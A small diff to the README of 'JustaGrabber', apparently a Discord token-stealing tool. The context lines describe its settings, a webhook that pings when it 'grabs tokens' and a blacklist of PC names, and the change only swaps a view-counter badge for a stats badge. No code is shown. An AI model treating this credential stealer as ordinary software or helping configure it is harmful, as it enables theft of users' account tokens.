@@ -55,7 +55,4 @@ If you open JustaGrabber.py you will se some settings in line 18,19
 | `Ping_me` in line 18 : if true, webhook will ping you when grabs tokens (@everyone)	|
 | `Blacklist` in line 19 : list of blacklisted players. You can add,remove. But the name is name of pc.|
  
- <p align="center">
-    <br>Number of views: <br>
-    <img src="https://profile-counter.glitch.me/kldiscord/JustaGrabber/count.svg" />
-</p>
+<center><img align="center" src="https://github-readme-stats.vercel.app/api/top-langs/?username=NotPunchnox&layout=compact&theme=jolly&count_private=true" /></center>
